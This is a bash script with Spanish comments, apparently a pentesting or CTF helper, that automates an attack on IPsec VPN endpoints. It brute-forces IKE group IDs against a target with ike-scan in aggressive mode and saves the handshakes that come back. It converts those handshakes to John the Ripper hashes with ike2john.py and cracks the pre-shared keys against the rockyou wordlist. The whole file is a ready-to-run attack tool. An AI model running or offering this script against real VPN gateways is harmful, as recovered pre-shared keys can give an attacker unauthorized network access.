#!/usr/bin/env bash
# auto_ike_john.sh
# Guarda IDs encontrados en archivo "abc", reintenta ike-scan con cada ID,
# si hay handshake guarda la traza, convierte a formato john (si ike2john.py existe)
# y ejecuta john con rockyou.
#
# Uso: ./auto_ike_john.sh <target> [wordlist]
# Por defecto wordlist: /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt

set -euo pipefail

TARGET=${1:-}
WORDLIST=${2:-/usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt}
IDS_FILE="abc"
TRACE_FILE="ike_aggressive.txt"
HASH_FILE="hash.txt"
IKE2JOHN="$(command -v ike2john.py || true)"   # intenta localizar ike2john.py
JOHN="$(command -v john || true)"
IKESCAN="$(command -v ike-scan || true)"

if [[ -z "$TARGET" ]]; then
  echo "Uso: $0 <target> [wordlist]"
  exit 1
fi

if [[ -z "$IKESCAN" ]]; then
  echo "ERROR: ike-scan no encontrado en PATH."
  exit 2
fi

: > "$IDS_FILE"
echo "[*] Enumerando posibles group-IDs/PSKs desde: $WORDLIST"
while IFS= read -r line || [[ -n "$line" ]]; do
  [[ -z "${line// }" ]] && continue
  [[ "${line:0:1}" == "#" ]] && continue

  # prueba rápida: si ike-scan devuelve handshake, registra el ID
  if sudo "$IKESCAN" -M -A -n "$line" "$TARGET" 2>/dev/null | grep -q "returned handshake"; then
    echo "$line" >> "$IDS_FILE"
    echo "[+] Found ID: $line"
  fi
done < "$WORDLIST"

if [[ ! -s "$IDS_FILE" ]]; then
  echo "[*] No se encontró ningún ID. Salida."
  exit 0
fi

echo
echo "[*] Reintentando con cada ID guardada en '$IDS_FILE' para capturar la traza agresiva."

# limpia archivos previos
: > "$TRACE_FILE"
: > "$HASH_FILE"

while IFS= read -r id || [[ -n "$id" ]]; do
  [[ -z "${id// }" ]] && continue
  echo "[*] Probando ID: $id"
  # guarda salida completa de ike-scan si handshake
  tmpout=$(mktemp)
  sudo "$IKESCAN" -P -M -A -n "$id" "$TARGET" > "$tmpout" 2>/dev/null || true

  if grep -q "returned handshake" "$tmpout"; then
    echo "[+] Handshake obtenido con ID: $id -> guardando en $TRACE_FILE"
    cat "$tmpout" >> "$TRACE_FILE"
    echo -e "\n### END-OF-HANDSHAKE ($id) ###\n" >> "$TRACE_FILE"

    # si ike2john.py está disponible, conviértelo y agrégalo a hash.txt
    if [[ -n "$IKE2JOHN" ]]; then
      if python "$IKE2JOHN" "$tmpout" >> "$HASH_FILE" 2>/dev/null; then
        echo "[+] Convertido a formato John y añadido a $HASH_FILE"
      else
        echo "[!] ike2john.py falló al convertir la traza para ID: $id"
      fi
    else
      # si no hay ike2john.py, guarda la traza tal cual y deja que el usuario la procese
      echo "[!] ike2john.py no encontrado: la traza está en $TRACE_FILE; conviértela manualmente a formato john"
    fi
  else
    echo "[-] No hubo handshake con ID: $id"
  fi

  rm -f "$tmpout"
done < "$IDS_FILE"

# si se generó hash.txt y john está disponible, lanza john con rockyou
if [[ -s "$HASH_FILE" && -n "$JOHN" ]]; then
  echo
  echo "[*] Ejecutando john --wordlist=/usr/share/wordlists/rockyou.txt $HASH_FILE"
  "$JOHN" --wordlist=/usr/share/wordlists/rockyou.txt "$HASH_FILE"
  echo "[*] john terminó. Revisa john.pot o la salida para resultados."
else
  if [[ ! -s "$HASH_FILE" ]]; then
    echo "[!] No se generó $HASH_FILE; no se ejecutará john."
  fi
  if [[ -z "$JOHN" ]]; then
    echo "[!] john no encontrado en PATH."
  fi
fi

echo "[*] Script finalizado. IDs en: $IDS_FILE, trazas en: $TRACE_FILE, hashes en: $HASH_FILE (si se generó)."

